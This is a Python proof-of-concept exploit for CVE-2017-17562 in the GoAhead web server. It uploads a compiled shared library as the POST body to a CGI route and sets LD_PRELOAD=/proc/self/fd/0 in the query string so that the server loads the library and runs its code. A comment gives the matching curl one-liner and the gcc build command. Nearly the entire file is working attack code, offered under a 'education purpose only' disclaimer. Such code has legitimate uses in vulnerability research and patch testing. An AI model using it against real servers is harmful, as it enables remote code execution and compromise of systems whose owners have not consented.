#!/usr/bin/env python
#__author__ == 'Kios'

#curl -X POST --data-binary @_payload.so http://127.0.0.1/cgi-bin/cgitest?LD_PRELOAD=/proc/self/fd/0 -i | head
#Generate _payload.so: gcc -shared -fPIC _payload.c -o _payload.so

import httplib

class PoC(object):
    '''
    CVE-2017-17562 PoC
    Education purpose only! Do not use illegal way!
    '''
    def __init__(self, server, port,  payload, cgiroute='cgitest'):
        '''
        Initialize
        '''
        self.server = server
        self.port = port
        self.payload = payload
        self.cgiroute = cgiroute

    def _loadBinarypayload(self):
        '''
        Load binary
        '''
        f = open(self.payload, 'rb')
        payload = f.read()
        f.close()
        return payload
    
    def _verify(self,res):
        if res.getheader('info'):
            print(">>> Vulnerable!")
            print(">>> Hack info: {}".format(res.getheader('info')))
        else:
            print('>>> Not vulnerable!')

    def run(self):
        '''
        run PoC
        '''
        _url = '/cgi-bin/' +  self.cgiroute + '?LD_PRELOAD=/proc/self/fd/0'
        _payload_data = self._loadBinarypayload()
        
        headers = {"Host": self.server,
                    "User-Agent": "curl/7.51.0",
                    "Accept": "*/*",
                    "Content-Length": str(len(_payload_data))}
        conn = httplib.HTTPConnection(self.server, self.port)
        conn.connect()
        conn.request("POST", _url, _payload_data, headers)

        try:
            res = conn.getresponse()
            self._verify(res)
        except Exception as e:
            print(">>> error encountered! {}".format(str(e)))
        
        conn.close()

if __name__ == '__main__':
    obj1 = PoC('127.0.0.1',80,'_payload.so')
    obj1.run()
